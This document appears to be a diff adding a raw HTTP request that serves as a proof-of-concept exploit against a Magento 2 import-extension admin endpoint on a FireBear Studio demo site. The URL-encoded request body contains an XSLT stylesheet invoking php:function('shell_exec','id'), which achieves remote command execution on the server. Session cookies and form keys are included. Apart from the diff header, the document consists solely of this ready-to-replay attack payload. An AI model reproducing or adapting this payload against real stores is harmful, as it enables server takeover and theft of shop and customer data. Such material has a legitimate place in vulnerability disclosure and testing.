@@ -1,0 +1,19 @@
+POST /admin_k1b5n8/import/job/xslt/key/ca288bdd3db1f1f7e70bb75d7242e50492feb9c0a68f23645423bd81274dea0b/?isAjax=true HTTP/2
+Host: magento2demo.firebearstudio.com
+Cookie: admin=5405c8be6f1f6898e4170ef61e30d1fa; form_key=PAojyzkEBmmqSgVX; PHPSESSID=99dbe2c64f4a256159a21f1842a31669; form_key=PAojyzkEBmmqSgVX; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://magento2demo.firebearstudio.com/admin_k1b5n8/import/job/edit/entity_id/21/key/07621d48583dee71d07c0a35076af13c48d1f1abffa7efc4edcf363739a4bafa/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 1353
+Origin: https://magento2demo.firebearstudio.com
+Dnt: 1
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+form_data%5B%5D=file_path%2Bpub%2Fmedia%2Fimportexport%2Fh%2Fe%2Fhello_38.xml&form_data%5B%5D=xslt%2B%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%0A%3Cxsl%3Astylesheet+version%3D%221.0%22%0Axmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%0Axmlns%3Aphp%3D%22http%3A%2F%2Fphp.net%2Fxsl%22%3E%0A++%3Cxsl%3Atemplate+match%3D%22%2F%22%3E%0A++++%3Cxsl%3Avalue-of+select%3D%22php%3Afunction('shell_exec'%2C'id')%22+%2F%3E%0A++%3C%2Fxsl%3Atemplate%3E%0A%3C%2Fxsl%3Astylesheet%3E&form_data%5B%5D=import_source%2Bfile&form_data%5B%5D=type_file%2Bxml&form_data%5B%5D=host%2B&form_data%5B%5D=port%2B&form_data%5B%5D=username%2B&form_data%5B%5D=password%2B&form_data%5B%5D=type_file%2Bxml&form_data%5B%5D=import_source%2Bfile&form_data%5B%5D=file_upload%2B&form_data%5B%5D=predefined_structure%2B0&form_data%5B%5D=file_path%2Bpub%2Fmedia%2Fimportexport%2Fh%2Fe%2Fhello_38.xml&form_data%5B%5D=import_images_file_dir%2B&form_data%5B%5D=scan_directory%2B0&form_data%5B%5D=deferred_images%2B0&form_data%5B%5D=delete_file_after_import%2B0&form_data%5B%5D=archive_file_after_import%2B0&form_data%5B%5D=image_import_source%2B0&form_data%5B%5D=remove_current_mappings%2B0&form_data%5B%5D=associate_child_review_to_configurable_parent_product%2B0&form_data%5B%5D=associate_child_review_to_bundle_parent_product%2B0&form_key=4MyTCEHq4qNJXQB4
